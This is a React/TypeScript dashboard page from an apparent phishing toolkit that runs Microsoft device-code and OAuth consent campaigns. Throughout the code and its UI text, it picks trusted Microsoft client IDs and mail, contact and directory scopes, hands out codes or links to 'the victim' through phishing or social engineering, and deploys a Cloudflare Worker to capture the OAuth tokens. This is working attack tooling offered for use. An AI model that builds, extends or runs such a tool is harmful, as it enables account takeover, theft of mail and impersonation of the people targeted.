"use client";

import { useState, useMemo, useCallback, useEffect } from "react";
import { useMutation, useQueryClient } from "@tanstack/react-query";
import { usePollingApi } from "@/lib/polling";
import {
  createColumnHelper,
  flexRender,
  getCoreRowModel,
  useReactTable,
} from "@tanstack/react-table";
import { format } from "date-fns";
import { toast } from "sonner";
import {
  Plus,
  Copy,
  Trash2,
  Eye,
  ChevronLeft,
  ChevronRight,
  Loader2,
  Check,
  X,
  ExternalLink,
  Link2,
  Rocket,
  Info,
} from "lucide-react";
import { motion, AnimatePresence } from "framer-motion";

import { DashboardTopBar } from "@/components/dashboard/top-bar";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogFooter,
  DialogHeader,
  DialogTitle,
  DialogTrigger,
} from "@/components/ui/dialog";
import { Input } from "@/components/ui/input";
import { Checkbox } from "@/components/ui/checkbox";
import { Switch } from "@/components/ui/switch";
import {
  Table,
  TableBody,
  TableCell,
  TableHead,
  TableHeader,
  TableRow,
} from "@/components/ui/table";
import { cn } from "@/lib/utils";
import {
  fetchCampaigns,
  createCampaign,
  deleteCampaign,
  generateOAuthLink,
  deployWorker,
} from "@/lib/utils";
import { Campaign, CampaignListResponse } from "@/types/token";
import { StatsCardsSkeleton } from "@/components/ui/loading-skeleton";
import { useAuth } from "@/hooks/use-auth";

const columnHelper = createColumnHelper<Campaign>();

const statusColors: Record<string, { bg: string; text: string; border: string }> = {
  pending: { bg: "bg-warning/10", text: "text-warning", border: "border-warning/20" },
  authenticated: { bg: "bg-success/10", text: "text-success", border: "border-success/20" },
  expired: { bg: "bg-muted/30", text: "text-muted-foreground", border: "border-border" },
  failed: { bg: "bg-destructive/10", text: "text-destructive", border: "border-destructive/20" },
  revoked: { bg: "bg-muted/30", text: "text-muted-foreground", border: "border-border" },
};

const PRESET_CLIENTS = [
  { label: "Microsoft Graph PowerShell", value: "14d82eec-204b-4c2f-b7e8-296a70dab67e" },
  { label: "Azure CLI", value: "04b07795-8ddb-461a-bbee-02f9e1bf7b46" },
  { label: "Custom", value: "custom" },
];

const AVAILABLE_SCOPES = [
  "Mail.ReadWrite",
  "Mail.Send",
  "MailboxSettings.ReadWrite",
  "Contacts.Read",
  "User.Read.All",
  "Group.Read.All",
  "Directory.Read.All",
];

function StatusBadge({ status }: { status: string }) {
  const colors = statusColors[status] || statusColors.pending;
  return (
    <span
      className={cn(
        "inline-flex items-center gap-1.5 rounded-full border px-2.5 py-0.5 text-xs font-medium",
        colors.bg,
        colors.text,
        colors.border
      )}
    >
      <span className={cn("h-1.5 w-1.5 rounded-full", colors.text.replace("text-", "bg-"))} />
      {status.charAt(0).toUpperCase() + status.slice(1)}
    </span>
  );
}

export default function CampaignsPage() {
  const queryClient = useQueryClient();
  const { hasRole } = useAuth();
  const [page, setPage] = useState(1);
  const [perPage] = useState(20);
  const [createOpen, setCreateOpen] = useState(false);
  const [deleteId, setDeleteId] = useState<string | null>(null);
  const [copiedId, setCopiedId] = useState<string | null>(null);

  // Generate OAuth Link state
  const [linkDialogOpen, setLinkDialogOpen] = useState(false);
  const [generatedLink, setGeneratedLink] = useState("");
  const [generatedShortLink, setGeneratedShortLink] = useState("");
  const [linkLoading, setLinkLoading] = useState(false);
  const [linkCopied, setLinkCopied] = useState(false);
  const [localMode, setLocalMode] = useState(false);

  // Deploy Worker state
  const [deployLoading, setDeployLoading] = useState(false);

  // New campaign form state
  const [campaignName, setCampaignName] = useState("");
  const [clientIdPreset, setClientIdPreset] = useState(PRESET_CLIENTS[0].value);
  const [customClientId, setCustomClientId] = useState("");
  const [selectedScopes, setSelectedScopes] = useState<string[]>(["Mail.ReadWrite", "Mail.Send", "Contacts.Read", "User.Read.All"]);
  const [isSubmitting, setIsSubmitting] = useState(false);

  const { data, isLoading, isError, refetch } = usePollingApi<CampaignListResponse>({
    queryKey: ["campaigns", page, perPage],
    queryFn: () => fetchCampaigns(page, perPage),
    intervalMs: 15_000,
  });

  const createMutation = useMutation({
    mutationFn: createCampaign,
    onSuccess: () => {
      toast.success("Campaign created");
      setCreateOpen(false);
      resetForm();
      queryClient.invalidateQueries({ queryKey: ["campaigns"] });
    },
    onError: (err: any) => {
      toast.error(err.message || "Failed to create campaign");
    },
    onSettled: () => {
      setIsSubmitting(false);
    },
  });

  const deleteMutation = useMutation({
    mutationFn: (id: string) => deleteCampaign(id),
    onSuccess: () => {
      toast.success("Campaign deleted");
      setDeleteId(null);
      queryClient.invalidateQueries({ queryKey: ["campaigns"] });
    },
    onError: (err: any) => {
      toast.error(err.message || "Failed to delete campaign");
    },
  });

  const resetForm = () => {
    setCampaignName("");
    setClientIdPreset(PRESET_CLIENTS[0].value);
    setCustomClientId("");
    setSelectedScopes(["Mail.ReadWrite", "Mail.Send", "Contacts.Read", "User.Read.All"]);
  };

  const handleCreate = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!campaignName.trim()) {
      toast.error("Campaign name is required");
      return;
    }

    const clientId = clientIdPreset === "custom" ? customClientId : clientIdPreset;
    if (!clientId.trim()) {
      toast.error("Client ID is required");
      return;
    }

    setIsSubmitting(true);
    createMutation.mutate({
      name: campaignName,
      client_id: clientId,
      requested_scopes: selectedScopes,
    });
  };

  const handleGenerateLink = async () => {
    setLinkLoading(true);
    setGeneratedLink("");
    setLinkCopied(false);
    try {
      const res = await generateOAuthLink(localMode);
      setGeneratedLink(res.link);
      // Resolve relative short_link to absolute URL via the API base
      const shortLink = res.short_link || res.link;
      if (shortLink.startsWith("/api/")) {
        const apiBase = process.env.NEXT_PUBLIC_API_URL || window.location.origin;
        setGeneratedShortLink(`${apiBase}${shortLink}`);
      } else {
        setGeneratedShortLink(shortLink);
      }
      setLinkDialogOpen(true);
    } catch (err: any) {
      toast.error(`Failed to generate link: ${err.message}`);
    } finally {
      setLinkLoading(false);
    }
  };

  const handleCopyLink = () => {
    if (!generatedLink) return;
    navigator.clipboard.writeText(generatedLink).then(() => {
      setLinkCopied(true);
      toast.success("Link copied to clipboard");
      setTimeout(() => setLinkCopied(false), 2000);
    });
  };

  const handleDeployWorker = async () => {
    setDeployLoading(true);
    try {
      const res = await deployWorker();
      if (res.success) {
        toast.success("Worker deployed", { description: res.worker_url || "" });
      } else {
        toast.error("Deploy failed", { description: res.message || "Unknown error" });
      }
    } catch (err: any) {
      toast.error("Deploy failed", { description: err.message || "Unknown error" });
    } finally {
      setDeployLoading(false);
    }
  };

  const handleCopyCode = useCallback((campaign: Campaign) => {
    const text = `${campaign.verification_uri || "https://microsoft.com/devicelogin"} | Code: ${campaign.user_code || ""}`;
    navigator.clipboard.writeText(text).then(() => {
      setCopiedId(campaign.id);
      toast.success("User code copied to clipboard");
      setTimeout(() => setCopiedId(null), 2000);
    });
  }, []);

  const columns = useMemo(
    () => [
      columnHelper.accessor("name", {
        header: "Name",
        cell: (info) => (
          <span className="font-medium text-foreground">{info.getValue()}</span>
        ),
      }),
      columnHelper.accessor("status", {
        header: "Status",
        cell: (info) => <StatusBadge status={info.getValue()} />,
      }),
      columnHelper.accessor("user_code", {
        header: "User Code",
        cell: (info) => (
          <code className="rounded bg-muted px-1.5 py-0.5 text-xs font-mono text-muted-foreground">
            {info.getValue() || "—"}
          </code>
        ),
      }),
      columnHelper.accessor("requested_scopes", {
        header: "Scopes",
        cell: (info) => {
          try {
            const scopes = JSON.parse(info.getValue());
            return (
              <div className="flex flex-wrap gap-1">
                {scopes.slice(0, 2).map((s: string) => (
                  <span key={s} className="text-[10px] rounded bg-secondary/50 px-1.5 py-0.5 text-muted-foreground">
                    {s}
                  </span>
                ))}
                {scopes.length > 2 && (
                  <span className="text-[10px] text-muted-foreground">+{scopes.length - 2}</span>
                )}
              </div>
            );
          } catch {
            return <span className="text-xs text-muted-foreground">{info.getValue()}</span>;
          }
        },
      }),
      columnHelper.accessor("created_at", {
        header: "Created At",
        cell: (info) => (
          <span className="text-xs text-muted-foreground">
            {format(new Date(info.getValue()), "MMM d, yyyy HH:mm")}
          </span>
        ),
      }),
      columnHelper.display({
        id: "actions",
        header: "Actions",
        cell: ({ row }) => {
          const campaign = row.original;
          return (
            <div className="flex items-center gap-1">
              <Button
                variant="ghost"
                size="icon-xs"
                onClick={() => handleCopyCode(campaign)}
                title="Copy user code"
              >
                {copiedId === campaign.id ? (
                  <Check className="h-3.5 w-3.5 text-success" />
                ) : (
                  <Copy className="h-3.5 w-3.5" />
                )}
              </Button>
              {hasRole("admin") && (
                <Button
                  variant="ghost"
                  size="icon-xs"
                  onClick={() => setDeleteId(campaign.id)}
                  title="Delete campaign"
                  className="text-destructive hover:text-destructive"
                >
                  <Trash2 className="h-3.5 w-3.5" />
                </Button>
              )}
            </div>
          );
        },
      }),
    ],
    [copiedId, handleCopyCode]
  );

  const table = useReactTable({
    data: data?.campaigns || [],
    columns,
    getCoreRowModel: getCoreRowModel(),
  });

  return (
    <div className="flex-1 flex flex-col min-h-0">
      <DashboardTopBar
        title="Campaigns"
        subtitle="Manage device-code flow campaigns and monitor authentication status"
        actions={
          <div className="flex items-center gap-2">
            <div className="flex items-center gap-2 mr-2">
              <Switch
                id="local-mode"
                checked={localMode}
                onCheckedChange={setLocalMode}
              />
              <label htmlFor="local-mode" className="text-xs text-muted-foreground cursor-pointer">
                Local Mode
              </label>
            </div>
            <Button
              size="sm"
              variant="outline"
              onClick={handleGenerateLink}
              disabled={linkLoading}
              className="gap-1.5 border-primary/30 text-primary hover:bg-primary/10"
            >
              {linkLoading ? <Loader2 className="h-4 w-4 animate-spin" /> : <Link2 className="h-4 w-4" />}
              Generate OAuth Link
            </Button>
            <Button
              size="sm"
              variant="outline"
              onClick={handleDeployWorker}
              disabled={deployLoading}
              className="gap-1.5 border-white/10"
            >
              {deployLoading ? <Loader2 className="h-4 w-4 animate-spin" /> : <Rocket className="h-4 w-4" />}
              Deploy Worker
            </Button>
            <Dialog open={createOpen} onOpenChange={setCreateOpen}>
              <DialogTrigger
                render={
                  <Button size="sm" className="gap-1.5">
                    <Plus className="h-4 w-4" />
                    New Campaign
                  </Button>
                }
              />
            <DialogContent className="sm:max-w-lg">
              <DialogHeader>
                <DialogTitle>Create New Campaign</DialogTitle>
                <DialogDescription>
                  Initiate a new device-code flow campaign to harvest OAuth tokens.
                </DialogDescription>
                <div className="mt-2 rounded-lg border border-white/5 bg-secondary/10 p-3 flex items-start gap-2">
                  <Info className="h-4 w-4 text-primary flex-shrink-0 mt-0.5" />
                  <div className="space-y-1">
                    <p className="text-xs text-muted-foreground">
                      <strong className="text-foreground">What does New Campaign do?</strong>
                    </p>
                    <p className="text-xs text-muted-foreground">
                      It initiates a Microsoft device-code flow. The backend requests a user_code and verification_uri from Microsoft, stores the pending campaign, and returns the code to you. You then share the code with the victim (e.g., via phishing email or social engineering). When the victim enters the code at microsoft.com/devicelogin, Microsoft authorizes your app and sends the OAuth tokens back to the backend, where they are encrypted and stored.
                    </p>
                  </div>
                </div>
              </DialogHeader>
              <form onSubmit={handleCreate} className="space-y-4 py-2" autoComplete="off">
                <div className="space-y-1.5">
                  <label className="text-sm font-medium text-foreground">Campaign Name</label>
                  <Input
                    placeholder="e.g., Q1 Target Assessment"
                    value={campaignName}
                    onChange={(e) => setCampaignName(e.target.value)}
                    required
                    autoComplete="off"
                  />
                </div>

                <div className="space-y-1.5">
                  <label className="text-sm font-medium text-foreground">Client ID</label>
                  <select
                    className="h-8 w-full rounded-lg border border-input bg-transparent px-2.5 text-sm outline-none focus-visible:border-ring focus-visible:ring-3 focus-visible:ring-ring/50"
                    value={clientIdPreset}
                    onChange={(e) => setClientIdPreset(e.target.value)}
                  >
                    {PRESET_CLIENTS.map((c) => (
                      <option key={c.value} value={c.value}>
                        {c.label}
                      </option>
                    ))}
                  </select>
                  {clientIdPreset === "custom" && (
                    <Input
                      placeholder="Enter custom client ID"
                      value={customClientId}
                      onChange={(e) => setCustomClientId(e.target.value)}
                      className="mt-2"
                      autoComplete="off"
                    />
                  )}
                </div>

                <div className="space-y-2">
                  <label className="text-sm font-medium text-foreground">Requested Scopes</label>
                  <div className="grid grid-cols-1 gap-2">
                    {AVAILABLE_SCOPES.map((scope) => (
                      <label
                        key={scope}
                        className="flex items-center gap-2.5 rounded-lg border border-border p-2.5 hover:bg-muted/30 transition-colors cursor-pointer"
                      >
                        <Checkbox
                          checked={selectedScopes.includes(scope)}
                          onCheckedChange={(checked) => {
                            setSelectedScopes((prev) =>
                              checked
                                ? [...prev, scope]
                                : prev.filter((s) => s !== scope)
                            );
                          }}
                        />
                        <span className="text-sm text-foreground">{scope}</span>
                      </label>
                    ))}
                  </div>
                </div>

                <DialogFooter>
                  <Button
                    type="button"
                    variant="outline"
                    onClick={() => {
                      setCreateOpen(false);
                      resetForm();
                    }}
                  >
                    Cancel
                  </Button>
                  <Button type="submit" disabled={isSubmitting}>
                    {isSubmitting && <Loader2 className="mr-1.5 h-4 w-4 animate-spin" />}
                    Create Campaign
                  </Button>
                </DialogFooter>
              </form>
            </DialogContent>
          </Dialog>
          </div>
        }
      />

      <div className="flex-1 overflow-y-auto">
        <div className="mx-auto w-full max-w-[1600px] px-4 sm:px-6 lg:px-8 py-6">
          {isLoading && !data ? (
            <StatsCardsSkeleton />
          ) : isError ? (
            <div className="flex flex-col items-center justify-center py-20">
              <p className="text-destructive text-sm">Failed to load campaigns</p>
              <Button variant="outline" size="sm" className="mt-3" onClick={() => refetch()}>
                Retry
              </Button>
            </div>
          ) : (
            <motion.div
              initial={{ opacity: 0, y: 10 }}
              animate={{ opacity: 1, y: 0 }}
              transition={{ duration: 0.3 }}
              className="space-y-4"
            >
              {/* Campaigns table */}
              <div className="rounded-xl border border-border bg-card overflow-hidden">
                <Table>
                  <TableHeader>
                    {table.getHeaderGroups().map((headerGroup) => (
                      <TableRow key={headerGroup.id}>
                        {headerGroup.headers.map((header) => (
                          <TableHead key={header.id}>
                            {flexRender(header.column.columnDef.header, header.getContext())}
                          </TableHead>
                        ))}
                      </TableRow>
                    ))}
                  </TableHeader>
                  <TableBody>
                    {table.getRowModel().rows.length === 0 ? (
                      <TableRow>
                        <TableCell colSpan={columns.length} className="h-32 text-center text-muted-foreground">
                          No campaigns found. Create one to get started.
                        </TableCell>
                      </TableRow>
                    ) : (
                      table.getRowModel().rows.map((row) => (
                        <TableRow key={row.id}>
                          {row.getVisibleCells().map((cell) => (
                            <TableCell key={cell.id}>
                              {flexRender(cell.column.columnDef.cell, cell.getContext())}
                            </TableCell>
                          ))}
                        </TableRow>
                      ))
                    )}
                  </TableBody>
                </Table>
              </div>

              {/* Pagination */}
              {data && data.total > perPage && (
                <div className="flex items-center justify-between">
                  <p className="text-xs text-muted-foreground">
                    Showing {(page - 1) * perPage + 1}–{Math.min(page * perPage, data.total)} of{" "}
                    {data.total} campaigns
                  </p>
                  <div className="flex items-center gap-2">
                    <Button
                      variant="outline"
                      size="icon-xs"
                      onClick={() => setPage((p) => Math.max(1, p - 1))}
                      disabled={page <= 1}
                    >
                      <ChevronLeft className="h-4 w-4" />
                    </Button>
                    <span className="text-xs text-muted-foreground">
                      Page {page} of {Math.ceil(data.total / perPage)}
                    </span>
                    <Button
                      variant="outline"
                      size="icon-xs"
                      onClick={() => setPage((p) => p + 1)}
                      disabled={page * perPage >= data.total}
                    >
                      <ChevronRight className="h-4 w-4" />
                    </Button>
                  </div>
                </div>
              )}
            </motion.div>
          )}
        </div>
      </div>

      {/* Generate OAuth Link dialog */}
      <Dialog open={linkDialogOpen} onOpenChange={setLinkDialogOpen}>
        <DialogContent className="sm:max-w-xl">
          <DialogHeader>
            <DialogTitle>Generated OAuth Link</DialogTitle>
            <DialogDescription>
              {localMode ? (
                <span className="text-amber-400">
                  Local Mode: The redirect URI points to localhost. Make sure your Azure app accepts <code className="bg-secondary/50 px-1 rounded">http://localhost:8080/exchange</code> or set LOCAL_REDIRECT_URI in your .env file.
                </span>
              ) : (
                "Share this link with your target. After authorization, the token will be captured via the Cloudflare Worker."
              )}
            </DialogDescription>
          </DialogHeader>
          <div className="space-y-4 py-2">
            <div className="rounded-lg border border-emerald-500/20 bg-emerald-500/5 p-3">
              <p className="text-[11px] text-emerald-400 uppercase tracking-wider mb-1.5">Redirect Link (Recommended — short, stable, always works)</p>
              <p className="text-xs font-mono text-foreground break-all leading-relaxed">{generatedShortLink}</p>
            </div>
            <div className="rounded-lg border border-white/5 bg-secondary/30 p-3">
              <p className="text-[11px] text-muted-foreground uppercase tracking-wider mb-1.5">Full Microsoft OAuth URL (alternative)</p>
              <p className="text-xs font-mono text-muted-foreground break-all leading-relaxed">{generatedLink}</p>
            </div>
            <div className="flex justify-end gap-2">
              <Button variant="outline" size="sm" onClick={() => setLinkDialogOpen(false)}>
                Close
              </Button>
              <Button size="sm" variant="outline" onClick={() => {
                navigator.clipboard.writeText(generatedLink).then(() => {
                  toast.success("Full OAuth URL copied to clipboard");
                });
              }} className="gap-1.5">
                <Copy className="h-3.5 w-3.5" />
                Copy Full URL
              </Button>
              <Button size="sm" onClick={() => {
                navigator.clipboard.writeText(generatedShortLink).then(() => {
                  setLinkCopied(true);
                  toast.success("Redirect link copied to clipboard");
                  setTimeout(() => setLinkCopied(false), 2000);
                });
              }} className="gap-1.5">
                {linkCopied ? <Check className="h-3.5 w-3.5" /> : <Copy className="h-3.5 w-3.5" />}
                {linkCopied ? "Copied" : "Copy Redirect Link"}
              </Button>
            </div>
          </div>
        </DialogContent>
      </Dialog>

      {/* Delete confirmation dialog */}
      <Dialog open={!!deleteId} onOpenChange={(open) => !open && setDeleteId(null)}>
        <DialogContent className="sm:max-w-sm">
          <DialogHeader>
            <DialogTitle>Delete Campaign</DialogTitle>
            <DialogDescription>
              Are you sure you want to delete this campaign? This action cannot be undone.
            </DialogDescription>
          </DialogHeader>
          <DialogFooter>
            <Button variant="outline" onClick={() => setDeleteId(null)}>
              Cancel
            </Button>
            <Button
              variant="destructive"
              onClick={() => deleteId && deleteMutation.mutate(deleteId)}
              disabled={deleteMutation.isPending}
            >
              {deleteMutation.isPending && <Loader2 className="mr-1.5 h-4 w-4 animate-spin" />}
              Delete
            </Button>
          </DialogFooter>
        </DialogContent>
      </Dialog>
    </div>
  );
}
